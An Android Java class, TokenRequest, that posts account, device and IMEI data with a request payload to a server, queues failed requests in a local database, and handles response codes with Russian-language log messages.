package com.inet.android.request;

import java.io.IOException;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.request.Caller;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.db.RequestWithDataBase;
import com.inet.android.utils.Logging;

public class TokenRequest  extends DefaultRequest {
	private final String LOG_TAG = "DataRequest";
	Context ctx;
	private int type = 5;
	static RequestDataBaseHelper db;

	public TokenRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String request) {
		RequestTask mt = new RequestTask();
		mt.execute(request);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {

		@Override
		protected void onPreExecute() {
			super.onPreExecute();
		}

		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
	}

	@Override
	protected void sendPostRequest(String request) {
		Logging.doLog(LOG_TAG, "1: " + request, "1: " + request);
		if (!request.equals(" ")&&!request.equals("")) {
			SharedPreferences sp = PreferenceManager
					.getDefaultSharedPreferences(ctx);
			JSONObject jsonObject = new JSONObject();
			JSONArray jsonArray = new JSONArray();
			String requestArray = null;
			try {
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("device", sp.getString("device", "0000"));
				jsonObject.put("token", sp.getString("imei", "0000"));
				
				requestArray = "[" + request + "]";
				jsonArray = new JSONArray(requestArray);
				// jsonArray = new JSONArray(request);
				jsonObject.put("data", jsonArray);

				Logging.doLog(LOG_TAG, "jsonArray: " + jsonArray.toString(),
						jsonObject.toString());

			} catch (JSONException e1) {
				Logging.doLog(LOG_TAG, "json сломался", "json сломался");
				e1.printStackTrace();
			}

			String str = null;
			try {
				Logging.doLog(LOG_TAG, "do make.request: " + request,
						"do make.request: " + request);
				Logging.doLog(LOG_TAG, "do make.requestArray: " + requestArray,
						"do make.requestArray: " + requestArray);

				str = Caller.doMake(jsonObject.toString(), "informative", ctx);
			} catch (IOException e) {
				// Добавление в базу request
				e.printStackTrace();

				Logging.doLog(LOG_TAG, "db.request: " + request, "db.request: "
						+ request);

				db = new RequestDataBaseHelper(ctx);
				db.addRequest(new RequestWithDataBase(request, type));
			}
			if (str != null) {
				getRequestData(str);
			} else {
				Logging.doLog(LOG_TAG, "ответа от сервера нет",
						"ответа от сервера нет");
			}
		}else {
			Logging.doLog(LOG_TAG, "request == null",
					"request == null");
		}
	}

	@Override
	protected void getRequestData(String response) {
		String postRequest = null;

		Logging.doLog(LOG_TAG, "getResponseData: " + response,
				"getResponseData: " + response);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);

		JSONObject json = new JSONObject();
		try {
			json.put("account", sp.getString("account", "0000"));
			json.put("device", sp.getString("device", "0000"));
			json.put("imei", sp.getString("imei", "0000"));
		} catch (JSONException e) {
			e.printStackTrace();
		}
		postRequest = json.toString();

		JSONObject jsonObject = null;
		String str = null;
		try {
			jsonObject = new JSONObject(response);
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			str = null;
		}

		Editor ed = sp.edit();
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "");
		}

		if (str.equals("2")) {
			PeriodicRequest pr = new PeriodicRequest(ctx);
			pr.sendRequest(postRequest);
		}

		if (str.equals("0")) {
			String errstr = null;
			try {
				errstr = jsonObject.getString("error");
			} catch (JSONException e) {
				errstr = null;
			}
			if (errstr != null) {
				ed.putString("error", errstr);
			} else {
				ed.putString("error", "");
			}
			ed.commit();
			if (str.equals("0")) {
				Logging.doLog(LOG_TAG, "account не найден", "account не найден");

				ed.putString("account", "account");
			}
			if (str.equals("1"))
				Logging.doLog(LOG_TAG,
						"imei отсутствует или имеет неверный формат",
						"imei отсутствует или имеет неверный формат");
			if (str.equals("2"))
				Logging.doLog(LOG_TAG, "устройство с указанным imei уже есть",
						"устройство с указанным imei уже есть");
			if (str.equals("3"))
				Logging.doLog(LOG_TAG, "отсутствует ключ", "отсутствует ключ");
			if (str.equals("4"))
				Logging.doLog(LOG_TAG, "отсутствует или неверный type",
						"отсутствует или неверный type");
		}
		ed.commit();
	}

}